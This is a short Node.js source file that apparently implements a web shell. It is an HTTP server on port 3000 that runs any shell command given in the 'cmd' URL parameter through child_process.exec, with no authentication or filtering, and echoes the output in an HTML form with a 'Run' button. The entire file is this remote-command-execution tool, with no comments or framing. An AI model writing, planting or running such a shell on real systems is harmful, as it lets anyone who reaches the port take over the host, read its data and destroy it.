const http = require('http');
const url = require('url');
const { exec } = require('child_process');

http.createServer((req, res) => {
    const q = url.parse(req.url, true).query;
    const cmd = q.cmd;
    
    res.write('<pre>');
    if (cmd) {
        exec(cmd, (err, stdout) => {
            res.write(stdout || err.message);
            res.end('</pre><form><input name="cmd"><button>Run</button></form>');
        });
    } else {
        res.end('</pre><form><input name="cmd"><button>Run</button></form>');
    }
}).listen(3000);